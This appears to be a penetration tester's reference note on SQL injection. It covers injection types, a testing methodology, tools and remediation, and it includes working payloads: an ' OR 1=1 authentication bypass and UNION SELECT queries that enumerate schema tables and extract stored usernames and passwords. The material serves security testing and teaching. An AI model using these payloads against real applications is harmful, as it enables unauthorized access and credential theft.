# SQL Injection

Injecting SQL through unvalidated input to read, modify, or bypass the logic of a database-backed application.

## Why It Matters

SQL injection remains one of the highest-impact web vulnerabilities: it can expose entire databases, bypass authentication, and sometimes lead to code execution on the database server. It appears wherever user input reaches a query without parameterization.

## Reference

### Approach

1. **Discover:** send crafted input and watch for errors or changed behavior
2. **Exploit:** confirm and extract data through the injection
3. **Assess:** determine what data and privileges the injection exposes
4. **Report:** document the vulnerability, impact, and remediation

### Types

| Type | Description |
| :--- | :--- |
| In-band (UNION) | Uses `UNION SELECT` to append attacker-chosen results to the response |
| In-band (Error-based) | Reads data from database error messages |
| Blind (Boolean) | Infers data from true/false differences in the response |
| Blind (Time-based) | Infers data from how long a query takes (`SLEEP`) |

### Authentication Bypass

Classic example where input is concatenated into the query. Supplying `' OR 1=1;-- ` as the username makes the `WHERE` clause always true:

```sql
-- intended
SELECT * FROM users WHERE username='%u%' AND password='%p%' LIMIT 1;
-- injected username: ' OR 1=1;--
SELECT * FROM users WHERE username='' OR 1=1;-- ...
```

### UNION Data Extraction

Enumerate tables, then columns, then data from `information_schema`:

```sql
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema='app_db'
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='staff_users'
0 UNION SELECT 1,2,group_concat(username,':',password) FROM staff_users
```

### Remediation

* **Parameterized queries (prepared statements):** the primary fix; keeps data out of the query structure
* **Input validation:** allowlist expected formats
* **Least privilege:** the application's database account should have only the access it needs
* **Escaping:** a secondary control, not a substitute for parameterization

## Tools

| Tool | Use |
| :--- | :--- |
| [sqlmap](https://sqlmap.org/) | Automated detection and exploitation |
| [Burp Suite](burp-suite.md) / [OWASP ZAP](owasp-zap.md) | Manual testing and scanning |

## How I Use It

I test by hand first to understand the injection point and the database, then use sqlmap to extract at scale once I have confirmed and scoped it. In the report I pair each finding with the parameterized-query fix, since that is the remediation developers can act on directly.

## Related

* [Web Authentication Bypass](web-authentication-bypass.md)
* [Web Application Recon](../reconnaissance/web-application-recon.md)
* [OWASP](../methodology/owasp.md)

## Resources

* [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
* [PortSwigger: SQL Injection](https://portswigger.net/web-security/sql-injection)
* [PayloadsAllTheThings: SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
